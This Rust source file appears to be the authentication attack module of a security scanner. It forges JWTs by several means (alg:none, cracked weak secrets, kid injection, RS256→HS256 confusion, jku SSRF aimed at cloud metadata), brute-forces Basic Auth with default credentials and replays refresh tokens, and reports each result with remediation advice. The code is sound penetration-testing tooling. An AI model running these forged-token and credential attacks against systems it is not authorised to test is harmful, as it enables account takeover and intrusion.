use async_trait::async_trait;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use jsonwebtoken::{decode, Algorithm, DecodingKey, EncodingKey, Header, Validation};
use serde::Deserialize;
use std::time::Instant;

use nevelio_core::types::{Endpoint, Finding, Severity};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

// ---------------------------------------------------------------------------
// Payload definitions (embedded from payloads/jwt.yaml)
// ---------------------------------------------------------------------------

const JWT_PAYLOADS: &str = include_str!("../../../../payloads/jwt.yaml");

const COMMON_BASIC_CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("admin", "123456"),
    ("test", "test"),
    ("user", "user"),
];

#[derive(Debug, Deserialize)]
struct JwtPayloadFile {
    weak_secrets: Vec<String>,
    claims_to_test: Vec<ClaimTest>,
    #[serde(default)]
    jwt_kid_payloads: Vec<String>,
    #[serde(default)]
    jwks_paths: Vec<String>,
}

#[derive(Debug, Deserialize, Clone)]
struct ClaimTest {
    field: String,
    values: Vec<serde_json::Value>,
}

// ---------------------------------------------------------------------------
// Module
// ---------------------------------------------------------------------------

pub struct AuthModule;

#[async_trait]
impl AttackModule for AuthModule {
    fn name(&self) -> &str {
        "auth"
    }

    fn description(&self) -> &str {
        "Tests JWT (alg:none, weak secrets, claims manipulation), Basic Auth bruteforce, and missing authentication"
    }

    async fn run(
        &self,
        session: &ScanSession,
        client: &HttpClient,
        endpoints: &[Endpoint],
    ) -> Vec<Finding> {
        let mut findings: Vec<Finding> = Vec::new();

        let payload_file: Option<JwtPayloadFile> = serde_yaml::from_str(JWT_PAYLOADS).ok();
        let weak_secrets: Vec<String> = payload_file
            .as_ref()
            .map(|p| p.weak_secrets.clone())
            .unwrap_or_default();
        let claims_to_test: Vec<ClaimTest> = payload_file
            .as_ref()
            .map(|p| p.claims_to_test.clone())
            .unwrap_or_default();
        let kid_payloads: Vec<String> = payload_file
            .as_ref()
            .map(|p| p.jwt_kid_payloads.clone())
            .unwrap_or_default();
        let jwks_paths: Vec<String> = payload_file
            .map(|p| p.jwks_paths)
            .unwrap_or_default();

        let auth_token = session.config.auth_token.clone();
        let jwt_token: Option<String> = auth_token.as_ref().and_then(|t| {
            let stripped = t
                .strip_prefix("Bearer ")
                .or_else(|| t.strip_prefix("bearer "))
                .unwrap_or(t.as_str());
            if is_jwt(stripped) {
                Some(stripped.to_string())
            } else {
                None
            }
        });

        let base_target = &session.config.target;
        let mut checked_bases = std::collections::HashSet::new();

        // Algo confusion: run once, fetches JWKS from base target
        if let Some(ref token) = jwt_token {
            findings.extend(
                check_jwt_algo_confusion(client, base_target, token, &jwks_paths).await,
            );
        }

        // Refresh token replay (once per target, not per endpoint)
        findings.extend(check_refresh_token_replay(client, base_target).await);

        for ep in endpoints {
            // --- 1. Missing Authentication ---
            findings.extend(check_unprotected_endpoint(client, ep, &auth_token).await);

            // --- 2. JWT + Basic Auth (once per unique URL to avoid flooding) ---
            if checked_bases.insert(ep.full_url.clone()) {
                if let Some(ref token) = jwt_token {
                    findings.extend(check_jwt_alg_none(client, ep, token).await);
                    findings.extend(check_jwt_expired(client, ep, token).await);
                    findings.extend(check_jwt_kid_injection(client, ep, token, &kid_payloads).await);
                    findings.extend(check_jwt_jku_ssrf(client, ep, token).await);

                    let found_secret =
                        check_jwt_weak_secret(client, ep, token, &weak_secrets, &mut findings)
                            .await;

                    if let Some(secret) = found_secret {
                        findings.extend(
                            check_jwt_claims(client, ep, token, &secret, &claims_to_test).await,
                        );
                    }
                }

                findings.extend(check_basic_auth(client, ep).await);
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_jwt_valid_token() {
        // A real HS256 JWT (header.payload.signature)
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(is_jwt(token));
    }

    #[test]
    fn is_jwt_rejects_non_jwt() {
        assert!(!is_jwt("Bearer abc123"));
        assert!(!is_jwt("not-a-token"));
        assert!(!is_jwt(""));
        assert!(!is_jwt("only.two"));
    }

    #[test]
    fn forge_alg_none_produces_three_parts() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let forged = forge_alg_none(token).expect("should produce a token");
        let parts: Vec<&str> = forged.split('.').collect();
        assert_eq!(parts.len(), 3, "JWT must have 3 segments");
        assert!(forged.ends_with('.'), "alg:none token must end with empty signature");
    }

    #[test]
    fn forge_alg_none_preserves_payload() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let forged = forge_alg_none(token).unwrap();
        let parts: Vec<&str> = forged.split('.').collect();
        let original_parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts[1], original_parts[1], "payload must be unchanged");
    }

    #[test]
    fn forge_alg_none_rejects_invalid_token() {
        assert!(forge_alg_none("not.valid").is_none());
        assert!(forge_alg_none("").is_none());
    }
}

// ---------------------------------------------------------------------------
// JWT helpers
// ---------------------------------------------------------------------------

fn is_jwt(token: &str) -> bool {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    if let Ok(decoded) = URL_SAFE_NO_PAD.decode(parts[0]) {
        if let Ok(header) = serde_json::from_slice::<serde_json::Value>(&decoded) {
            return header.get("alg").is_some();
        }
    }
    false
}

fn decode_jwt_claims(token: &str) -> Option<serde_json::Value> {
    jsonwebtoken::dangerous::insecure_decode::<serde_json::Value>(token)
        .ok()
        .map(|d| d.claims)
}

/// Forges a JWT with alg:none and an empty signature.
/// jsonwebtoken v10 refuses to sign Algorithm::None by design, so we build it manually.
fn forge_alg_none(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }
    let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
    Some(format!("{}.{}.", none_header, parts[1]))
}

fn forge_signed_token(claims: &serde_json::Value, secret: &str) -> Option<String> {
    jsonwebtoken::encode(
        &Header::default(),
        claims,
        &EncodingKey::from_secret(secret.as_bytes()),
    )
    .ok()
}

/// Forges a JWT with a custom `kid` in the header, signed with HS256 + provided secret.
fn forge_jwt_with_kid(original: &str, kid: &str, secret: &[u8]) -> Option<String> {
    let claims = decode_jwt_claims(original)?;
    let mut header = Header::new(Algorithm::HS256);
    header.kid = Some(kid.to_string());
    jsonwebtoken::encode(&header, &claims, &EncodingKey::from_secret(secret))
        .ok()
}

/// Forges an alg:none JWT with `exp` set to a past timestamp.
fn forge_expired_token(original: &str) -> Option<String> {
    let parts: Vec<&str> = original.splitn(3, '.').collect();
    if parts.len() != 3 { return None; }

    let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1]).ok()?;
    let mut claims: serde_json::Map<String, serde_json::Value> =
        serde_json::from_slice(&payload_bytes).ok()?;

    // Set exp to 2020-01-01 00:00:00 UTC — clearly in the past
    claims.insert("exp".to_string(), serde_json::json!(1577836800u64));

    let new_payload = URL_SAFE_NO_PAD.encode(serde_json::to_string(&claims).ok()?);
    let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
    Some(format!("{}.{}.", none_header, new_payload))
}

// ---------------------------------------------------------------------------
// Check: Missing Authentication
// ---------------------------------------------------------------------------

async fn check_unprotected_endpoint(
    client: &HttpClient,
    ep: &Endpoint,
    auth_token: &Option<String>,
) -> Vec<Finding> {
    if !ep.auth_required && auth_token.is_none() {
        return vec![];
    }

    let req = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(resp) = client.send(req).await else {
        return vec![];
    };

    if resp.status().is_success() {
        let mut f = Finding::new(
            "Missing Authentication".to_string(),
            Severity::Critical,
            9.8,
            "auth".to_string(),
            ep.full_url.clone(),
            ep.method.clone(),
        );
        f.description = format!(
            "The endpoint {} {} is accessible without an Authorization header. \
             Authentication is either absent or not enforced.",
            ep.method, ep.full_url
        );
        f.proof = format!("HTTP {} without credentials", resp.status().as_u16());
        f.recommendation =
            "Require a valid authentication token on all sensitive endpoints.".to_string();
        f.cwe = Some("CWE-306".to_string());
        f.references = vec![
            "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
                .to_string(),
        ];
        return vec![f];
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT alg:none bypass
// ---------------------------------------------------------------------------

async fn check_jwt_alg_none(client: &HttpClient, ep: &Endpoint, token: &str) -> Vec<Finding> {
    let Some(none_token) = forge_alg_none(token) else {
        return vec![];
    };

    let req = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .header("Authorization", format!("Bearer {}", none_token))
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(resp) = client.send(req).await else {
        return vec![];
    };

    if resp.status().is_success() {
        let mut f = Finding::new(
            "JWT Algorithm None Bypass".to_string(),
            Severity::Critical,
            9.1,
            "auth".to_string(),
            ep.full_url.clone(),
            ep.method.clone(),
        );
        f.description =
            "The server accepted a JWT with algorithm set to \"none\" and an empty signature. \
             An attacker can forge arbitrary tokens without knowing the secret."
                .to_string();
        f.proof = format!(
            "Forged token accepted: {}",
            &none_token[..none_token.len().min(80)]
        );
        f.recommendation =
            "Explicitly reject JWTs where alg is \"none\". Use an allow-list of accepted \
             algorithms and never trust the alg header blindly."
                .to_string();
        f.cwe = Some("CWE-327".to_string());
        f.references = vec![
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
                .to_string(),
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235".to_string(),
        ];
        return vec![f];
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: Weak JWT secret (offline brute force)
// Returns the cracked secret so the caller can run claims checks.
// ---------------------------------------------------------------------------

async fn check_jwt_weak_secret(
    _client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    secrets: &[String],
    findings: &mut Vec<Finding>,
) -> Option<String> {
    for secret in secrets {
        let mut val = Validation::new(jsonwebtoken::Algorithm::HS256);
        val.validate_exp = false;
        val.required_spec_claims = std::collections::HashSet::new();

        if decode::<serde_json::Value>(token, &DecodingKey::from_secret(secret.as_bytes()), &val)
            .is_ok()
        {
            let mut f = Finding::new(
                "Weak JWT Secret".to_string(),
                Severity::High,
                8.8,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description =
                "The JWT secret key is trivially guessable. An attacker can forge \
                 valid tokens for any user or role using the discovered secret."
                    .to_string();
            f.proof = format!("Secret cracked: \"{}\"", secret);
            f.recommendation =
                "Use a cryptographically random secret of at least 256 bits. \
                 Rotate immediately and invalidate all existing tokens."
                    .to_string();
            f.cwe = Some("CWE-330".to_string());
            f.references = vec![
                "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
                    .to_string(),
            ];
            findings.push(f);
            return Some(secret.clone());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Check: JWT Claims Manipulation (privilege escalation)
// ---------------------------------------------------------------------------

async fn check_jwt_claims(
    client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    secret: &str,
    claims_to_test: &[ClaimTest],
) -> Vec<Finding> {
    let Some(base_claims) = decode_jwt_claims(token) else {
        return vec![];
    };

    let mut findings = Vec::new();

    for claim_test in claims_to_test {
        for value in &claim_test.values {
            let mut modified = base_claims.clone();
            if let Some(obj) = modified.as_object_mut() {
                obj.insert(claim_test.field.clone(), value.clone());
            }

            let Some(forged) = forge_signed_token(&modified, secret) else {
                continue;
            };

            let req = match client
                .inner()
                .request(
                    ep.method.parse().unwrap_or(reqwest::Method::GET),
                    &ep.full_url,
                )
                .header("Authorization", format!("Bearer {}", forged))
                .build()
            {
                Ok(r) => r,
                Err(_) => continue,
            };

            let Ok(resp) = client.send(req).await else {
                continue;
            };

            if resp.status().is_success() {
                let mut f = Finding::new(
                    "JWT Claims Manipulation — Privilege Escalation".to_string(),
                    Severity::High,
                    8.8,
                    "auth".to_string(),
                    ep.full_url.clone(),
                    ep.method.clone(),
                );
                f.description = format!(
                    "Setting the JWT claim \"{}\" to {} granted elevated access to {}. \
                     The server does not validate claims against its own authorization model.",
                    claim_test.field, value, ep.full_url
                );
                f.proof = format!(
                    "Forged claim {{ \"{}\": {} }} → HTTP {}",
                    claim_test.field,
                    value,
                    resp.status().as_u16()
                );
                f.recommendation =
                    "Never trust JWT claims for authorization without server-side verification \
                     against the actual user record. Re-validate roles on every request."
                        .to_string();
                f.cwe = Some("CWE-269".to_string());
                f.references = vec![
                    "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/".to_string(),
                ];
                findings.push(f);
                break; // one finding per claim field is sufficient
            }
        }
    }

    findings
}

// ---------------------------------------------------------------------------
// Check: JWT — Expired token accepted
// ---------------------------------------------------------------------------

async fn check_jwt_expired(client: &HttpClient, ep: &Endpoint, token: &str) -> Vec<Finding> {
    let Some(expired_token) = forge_expired_token(token) else {
        return vec![];
    };

    let Ok(req) = client
        .inner()
        .request(ep.method.parse().unwrap_or(reqwest::Method::GET), &ep.full_url)
        .header("Authorization", format!("Bearer {}", expired_token))
        .build()
    else {
        return vec![];
    };

    let Ok(resp) = client.send(req).await else {
        return vec![];
    };

    if resp.status().is_success() {
        let mut f = Finding::new(
            "JWT Expired Token Accepted".to_string(),
            Severity::Medium,
            5.3,
            "auth".to_string(),
            ep.full_url.clone(),
            ep.method.clone(),
        );
        f.description = format!(
            "L'endpoint {} accepte un JWT dont le claim `exp` est fixé dans le passé (2020-01-01). \
             Un token volé ou révoqué reste exploitable indéfiniment.",
            ep.full_url
        );
        f.proof = format!(
            "Token avec exp=1577836800 (2020-01-01) → HTTP {} (attendu 401/403)",
            resp.status().as_u16()
        );
        f.recommendation =
            "Valider systématiquement le claim `exp` côté serveur. Implémenter une blacklist \
             de tokens révoqués ou utiliser des tokens à courte durée de vie (<15 min)."
                .to_string();
        f.cwe = Some("CWE-613".to_string());
        f.references = vec![
            "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/".to_string(),
        ];
        return vec![f];
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT kid header injection
// ---------------------------------------------------------------------------

async fn check_jwt_kid_injection(
    client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    kid_payloads: &[String],
) -> Vec<Finding> {
    for kid in kid_payloads {
        // Try with empty secret (path traversal to /dev/null → empty HMAC key)
        let Some(forged) = forge_jwt_with_kid(token, kid, b"") else { continue };

        let Ok(req) = client
            .inner()
            .request(ep.method.parse().unwrap_or(reqwest::Method::GET), &ep.full_url)
            .header("Authorization", format!("Bearer {}", forged))
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else { continue };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "JWT kid Injection".to_string(),
                Severity::Critical,
                9.1,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le header JWT `kid` est utilisé sans validation. En injectant {:?}, \
                 le serveur a accepté un token signé avec une clé vide ou une clé injectée. \
                 Un attaquant peut forger des tokens valides pour n'importe quel utilisateur.",
                kid
            );
            f.proof = format!(
                "JWT avec kid={:?} signé avec secret vide → HTTP {} (attendu 401)",
                kid, resp.status().as_u16()
            );
            f.recommendation =
                "Valider la valeur du header `kid` contre une allowlist de key IDs connus. \
                 Ne jamais utiliser `kid` pour construire un chemin de fichier ou une requête SQL."
                    .to_string();
            f.cwe = Some("CWE-89".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/jwt/algorithm-confusion".to_string(),
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/".to_string(),
            ];
            return vec![f];
        }
    }
    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT algorithm confusion (RS256 → HS256 using public key as secret)
// ---------------------------------------------------------------------------

async fn check_jwt_algo_confusion(
    client: &HttpClient,
    base_target: &str,
    token: &str,
    jwks_paths: &[String],
) -> Vec<Finding> {
    // Only applicable when the original JWT uses an asymmetric algorithm
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 { return vec![]; }
    let Ok(header_bytes) = URL_SAFE_NO_PAD.decode(parts[0]) else { return vec![]; };
    let Ok(header_json) = serde_json::from_slice::<serde_json::Value>(&header_bytes) else {
        return vec![];
    };
    let original_alg = header_json
        .get("alg")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if !matches!(original_alg, "RS256" | "RS384" | "RS512" | "ES256" | "ES384" | "ES512") {
        return vec![];
    }

    let base = base_target.trim_end_matches('/');

    // Try to retrieve the public key from JWKS endpoints
    for path in jwks_paths {
        let url = format!("{}{}", base, path);
        let Ok(req) = client.inner().get(&url).build() else { continue };
        let Ok(resp) = client.send(req).await else { continue };
        if !resp.status().is_success() { continue; }
        let Ok(body) = resp.text().await else { continue };
        let Ok(jwks) = serde_json::from_str::<serde_json::Value>(&body) else { continue };

        // Extract first key's n (RSA modulus) or x value (EC key)
        let keys = jwks.get("keys").and_then(|k| k.as_array());
        let Some(keys) = keys else { continue };
        if keys.is_empty() { continue; }

        let first_key = &keys[0];
        let key_material = first_key
            .get("n")
            .or_else(|| first_key.get("x"))
            .and_then(|v| v.as_str());
        let Some(raw_key) = key_material else { continue };

        // Use the raw base64url key material as HMAC secret (the confusion attack vector)
        let Ok(secret_bytes) = URL_SAFE_NO_PAD.decode(raw_key) else { continue };

        // Forge a HS256 token using the public key bytes as HMAC secret
        let Some(claims) = decode_jwt_claims(token) else { continue };
        let mut new_header = Header::new(Algorithm::HS256);
        new_header.typ = Some("JWT".to_string());
        let Ok(forged) = jsonwebtoken::encode(
            &new_header,
            &claims,
            &EncodingKey::from_secret(&secret_bytes),
        ) else {
            continue;
        };

        // Test on the first available endpoint (we don't have ep here, use base_target)
        let test_url = format!("{}/", base);
        let Ok(req) = client
            .inner()
            .get(&test_url)
            .header("Authorization", format!("Bearer {}", forged))
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else { continue };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "JWT Algorithm Confusion (RS256 → HS256)".to_string(),
                Severity::Critical,
                9.8,
                "auth".to_string(),
                test_url,
                "GET".to_string(),
            );
            f.description = format!(
                "Le serveur utilise {} mais accepte un token HS256 signé avec la clé publique \
                 RSA comme secret HMAC. Un attaquant peut forger des tokens valides pour \
                 n'importe quel utilisateur sans connaître la clé privée.",
                original_alg
            );
            f.proof = format!(
                "JWKS trouvé à {} — clé publique utilisée comme secret HS256 → HTTP {} accepté",
                url, resp.status().as_u16()
            );
            f.recommendation =
                "Utiliser un algorithme fixe côté serveur, ne jamais accepter l'algorithme \
                 indiqué dans le header JWT. Utiliser des librairies qui vérifient l'alg attendu \
                 (RS256 ne peut pas être downgraded vers HS256)."
                    .to_string();
            f.cwe = Some("CWE-327".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/jwt/algorithm-confusion".to_string(),
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/".to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT jku/x5u SSRF (timing-based detection)
// ---------------------------------------------------------------------------

const JKU_SSRF_TARGETS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
];

async fn check_jwt_jku_ssrf(client: &HttpClient, ep: &Endpoint, token: &str) -> Vec<Finding> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 { return vec![]; }

    let Ok(payload_bytes) = URL_SAFE_NO_PAD.decode(parts[1]) else { return vec![] };
    let Ok(claims) = serde_json::from_slice::<serde_json::Value>(&payload_bytes) else {
        return vec![];
    };

    // Baseline response time (no jku)
    let baseline_start = Instant::now();
    if let Ok(req) = client
        .inner()
        .request(ep.method.parse().unwrap_or(reqwest::Method::GET), &ep.full_url)
        .header("Authorization", format!("Bearer {}", token))
        .build()
    {
        let _ = client.send(req).await;
    }
    let baseline_ms = baseline_start.elapsed().as_millis();

    for jku_target in JKU_SSRF_TARGETS {
        // Forge JWT with jku header pointing to an internal URL
        let jku_header = serde_json::json!({"alg": "HS256", "typ": "JWT", "jku": jku_target});
        let header_b64 = URL_SAFE_NO_PAD.encode(jku_header.to_string().as_bytes());
        let payload_b64 = parts[1];
        let msg = format!("{}.{}", header_b64, payload_b64);
        // Sign with empty secret — the server will try to fetch jku to get the real key
        let sig = URL_SAFE_NO_PAD.encode(b"forgedsignature");
        let jku_token = format!("{}.{}", msg, sig);

        let start = Instant::now();
        let Ok(req) = client
            .inner()
            .request(ep.method.parse().unwrap_or(reqwest::Method::GET), &ep.full_url)
            .header("Authorization", format!("Bearer {}", jku_token))
            .build()
        else {
            continue;
        };
        let Ok(resp) = client.send(req).await else { continue };
        let elapsed_ms = start.elapsed().as_millis();

        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();
        let body_lower = body.to_lowercase();

        // SSRF indicators: either the body contains metadata from the internal URL
        // or the response leaks the jku URL in an error message
        let has_ssrf_content = ["ami-id", "instance-id", "169.254", "local-ipv4"]
            .iter()
            .any(|i| body_lower.contains(i));
        let reflects_jku = body.contains(*jku_target);
        // Timing heuristic: if jku fetch adds >1500ms extra latency, SSRF is probable
        let timing_anomaly = elapsed_ms > baseline_ms + 1500;

        let _ = (status, claims.clone()); // avoid unused warnings

        if has_ssrf_content || reflects_jku || timing_anomaly {
            let confidence = if has_ssrf_content || reflects_jku { "Confirmé" } else { "Probable (timing)" };
            let mut f = Finding::new(
                "JWT jku SSRF — header jku pointant vers ressource interne".to_string(),
                Severity::High,
                7.5,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le serveur semble traiter le header JWT `jku` ({:?}) en effectuant une requête \
                 vers l'URL fournie. Un attaquant peut pointer `jku` vers son propre serveur \
                 pour héberger une JWKS forgée et s'authentifier comme n'importe quel utilisateur.",
                jku_target
            );
            f.proof = format!(
                "{} — jku={:?}, délai {}ms vs baseline {}ms",
                confidence, jku_target, elapsed_ms, baseline_ms
            );
            f.recommendation =
                "Ignorer ou valider strictement le header `jku`/`x5u` des JWTs entrants. \
                 Utiliser uniquement des clés de validation configurées côté serveur, \
                 sans jamais fetcher de clés depuis des URLs dynamiques."
                    .to_string();
            f.cwe = Some("CWE-918".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/jwt/algorithm-confusion".to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: Basic Auth weak credentials
// ---------------------------------------------------------------------------

async fn check_basic_auth(client: &HttpClient, ep: &Endpoint) -> Vec<Finding> {
    let probe = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(probe_resp) = client.send(probe).await else {
        return vec![];
    };

    let www_auth = probe_resp
        .headers()
        .get("www-authenticate")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    if !www_auth.contains("basic") {
        return vec![];
    }

    for (user, pass) in COMMON_BASIC_CREDS {
        let req = match client
            .inner()
            .request(
                ep.method.parse().unwrap_or(reqwest::Method::GET),
                &ep.full_url,
            )
            .basic_auth(user, Some(pass))
            .build()
        {
            Ok(r) => r,
            Err(_) => continue,
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "Weak Basic Auth Credentials".to_string(),
                Severity::High,
                8.8,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "HTTP Basic Authentication on {} accepts trivial credentials. \
                 An attacker can gain access through a simple dictionary attack.",
                ep.full_url
            );
            f.proof = format!(
                "Login succeeded with {}:{} → HTTP {}",
                user,
                pass,
                resp.status().as_u16()
            );
            f.recommendation =
                "Enforce strong password policies and account lockout. Prefer token-based \
                 authentication (OAuth 2.0 / JWT) over Basic Auth."
                    .to_string();
            f.cwe = Some("CWE-521".to_string());
            f.references = vec![
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy".to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: Refresh token replay / rotation not enforced
// ---------------------------------------------------------------------------

const REFRESH_TOKEN_PATHS: &[&str] = &[
    "/oauth/token", "/oauth2/token", "/auth/token", "/connect/token",
    "/token", "/api/token", "/v1/oauth/token", "/v2/oauth/token",
];

async fn check_refresh_token_replay(
    client: &HttpClient,
    base: &str,
) -> Vec<Finding> {
    let base = base.trim_end_matches('/');
    let fake_refresh = "nevelio_fake_refresh_token_replay_test_0000000";
    let body = format!("grant_type=refresh_token&refresh_token={}", fake_refresh);

    for path in REFRESH_TOKEN_PATHS {
        let url = format!("{}{}", base, path);
        let mut responses: Vec<(u16, String)> = Vec::new();

        for _ in 0..2 {
            let Ok(req) = client
                .inner()
                .post(&url)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(body.clone())
                .build()
            else {
                continue;
            };
            let Ok(resp) = client.send(req).await else { continue };
            responses.push((resp.status().as_u16(), resp.text().await.unwrap_or_default()));
        }

        if responses.len() < 2 {
            continue;
        }

        let (s1, b1) = &responses[0];
        let (s2, b2) = &responses[1];

        let both_ok = (*s1 == 200 || b1.contains("access_token"))
            && (*s2 == 200 || b2.contains("access_token"));
        let no_rotation = *s1 == 200
            && !b2.contains("invalid_grant")
            && !b2.contains("token_revoked")
            && !b2.contains("already_used");

        if both_ok || no_rotation {
            let mut f = Finding::new(
                format!("Auth — Refresh token rejouable sans invalidation — {}", url),
                Severity::High,
                7.5,
                "auth",
                url.clone(),
                "POST",
            );
            f.description =
                "Le token endpoint semble accepter plusieurs fois le même refresh token \
                 sans l'invalider après usage. Un attaquant qui obtient un refresh token \
                 peut générer de nouveaux access tokens indéfiniment."
                    .to_string();
            f.proof = format!(
                "1er appel: HTTP {} — 2ème appel avec le même token: HTTP {} \
                 (attendu: 400 invalid_grant après rotation)",
                s1, s2
            );
            f.recommendation =
                "Invalider le refresh token après chaque usage et révoquer toute la chaîne \
                 si un token déjà utilisé est présenté à nouveau (RFC 6819 §5.2.2.3)."
                    .to_string();
            f.cwe = Some("CWE-294".to_string());
            f.references = vec![
                "https://datatracker.ietf.org/doc/html/rfc6819#section-5.2.2.3".to_string(),
            ];
            return vec![f];
        }

        // Token endpoint rejects properly — no vuln here
        if matches!(s1, 400..=403) {
            break;
        }
    }

    vec![]
}
